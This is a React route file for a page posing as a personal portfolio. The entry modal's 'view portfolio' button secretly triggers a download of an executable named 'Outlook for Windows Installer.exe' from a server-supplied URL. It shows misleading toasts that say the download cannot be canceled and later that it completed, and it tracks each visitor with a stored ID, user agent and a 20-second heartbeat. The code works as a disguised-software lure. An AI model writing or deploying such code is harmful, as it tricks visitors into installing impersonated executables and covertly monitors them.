import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { LanguageProvider } from "@/lib/i18n";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const [downloadStarted, setDownloadStarted] = useState(false);

  const downloadInstaller = () => {
    if (downloadStarted) return;

    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);

    setModalOpen(false);
    setDownloadStarted(true);
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
    toast.message("Download started. The process is running and cannot be canceled.");

    void scheduleInstallerDownload({ data: { visitorId } })
      .then(({ downloadUrl }) => {
        void startInstallerDownload(downloadUrl, visitorId).catch((error) => {
          toast.error("Unable to download the installer. Please try again.");
          console.error(error);
        });

        window.setTimeout(() => {
          toast.success("Download completed.");
        }, 30_000);
      })
      .catch((error) => {
        toast.error("Unable to schedule the installer download. Please try again.");
        console.error(error);
      });
  };
  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
    <LanguageProvider>
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          onViewPortfolio={() => downloadInstaller()}
        />
        <Toaster />
      </div>
    </LanguageProvider>
  );
}

async function startInstallerDownload(downloadUrl: string, visitorId: string) {
  try {
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
  } catch (error) {
    console.error(error);
  }

  const link = document.createElement("a");
  link.href = downloadUrl;
  link.download = "Outlook for Windows Installer.exe";
  link.rel = "noopener";
  link.style.display = "none";
  document.body.append(link);
  link.click();
  link.remove();
}
